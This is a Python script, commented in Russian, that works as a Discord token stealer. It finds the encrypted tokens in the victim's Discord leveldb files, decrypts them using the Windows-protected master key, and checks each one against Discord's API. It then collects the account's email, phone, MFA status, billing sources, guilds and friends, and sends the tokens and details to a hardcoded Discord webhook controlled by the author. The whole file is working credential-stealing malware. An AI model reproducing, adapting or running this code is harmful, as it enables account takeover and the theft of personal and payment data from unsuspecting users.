import base64
import json
import os
import re

import requests
from Cryptodome.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData


base_url = "https://discord.com/api/v9/users/@me" #ссылка для проверки дискорд токена
roaming = os.getenv("appdata") #директория roaming
regexp_enc = r"dQw4w9WgXcQ:[^\"]*" #шаблон для поиска токена

webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1157738046314258614/0ufG0GGtqLOing7aE9BoLpdcX-8YE8_UNPb3lxTiw2nhXtSYrkAgIh9dtuJw94g_-DWA") #ссылка вебхука

tokens = [] #список всех токенов

boba = "" #стока, для сравенния старых токенов и новыми

paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\', #директория дискорда
        }


def decrypt_val(buff: bytes, master_key: bytes) -> str: #дешифровка
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass
    
def get_master_key(path: str) -> str: #мастер ключей
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

    return master_key

def validate_token(token: str) -> bool: #проверка валидности токена
        r = requests.get(base_url, headers={'Authorization': token}) #запрос по ссылке и токену

        if r.status_code == 200: #если код статуса равено 200
            return True #токен валидный

        return False #токен не валидный


for name, path in paths.items(): #имя, директория из списка директорий
    if not os.path.exists(path): #если не существует пути
        continue #продолжить
    _discord = name.replace(" ", "").lower() #переменная пути директории в нижний регистр
    if "cord" in path: #если в названии существует "cord"
        if not os.path.exists(roaming + f'\\discord\\Local State'): #если не существует пути (roaming+f'\\{_discord}\\Local State')
            continue #продолжить
        for file_name in os.listdir(path): #перебор файлов из списка в директории (path)
            if file_name[-3:] not in ["log", "ldb"]: #если расширение файла не "log", "ldb"
                continue #продолжить
            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: #перебор файлов из директории
                for y in re.findall(regexp_enc, line): #перебор из списка по шаблону (r"dQw4w9WgXcQ:[^\"]*")
                    token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\discord\\Local State')) #расшифровка
                    #print(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]))
                    #tokens.append(token)

                    if token != boba: #если токен отличается от переменной
                        tokens.append(token) #записываем токен
                    else: #иначе
                        pass #пропускаем

                    boba = token #переменная приравнивается токену

for item in tokens:
    if validate_token(item) == True:
        print("Token: " + item)
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': item}).json() 
        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']

        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
        billing = requests.get(
                'https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
        guilds = requests.get(
                'https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
        friends = requests.get(
                'https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
        gift_codes = requests.get(
                'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        embed = Embed(title=f"{username} ({user_id})", color=0x000000)
        embed.set_thumbnail(url=avatar)
        embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{item}```")
        embed.add_field(name="\u200b", value="\u200b", inline=False)
        embed.add_field(
                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
        embed.add_field(name="<:mfa:1021604916537602088> MFA:",
                            value=f"{mfa}", inline=True)

        embed.add_field(name="\u200b", value="\u200b", inline=False)

        embed.add_field(name="<a:rainbowheart:996004226092245072> Email:",
                            value=f"{email if email != None else 'None'}", inline=True)
        embed.add_field(name="<:starxglow:996004217699434496> Phone:",
                            value=f"{phone if phone != None else 'None'}", inline=True)
        embed.add_field(name="\u200b", value="\u200b", inline=False)
        embed.set_footer(text="By Negoduiy")

        webhook.send(embed=embed, username="хулинам.продакшн", avatar_url="https://images-ext-2.discordapp.net/external/Qw2qqbb7s8qwPRJ90hhGthbtPTFxuPotyhMw4gG78m8/https/cdn.discordapp.com/avatars/478872972417826818/25e30f5a58184a459c8321938080c32d.png")
    else:
        pass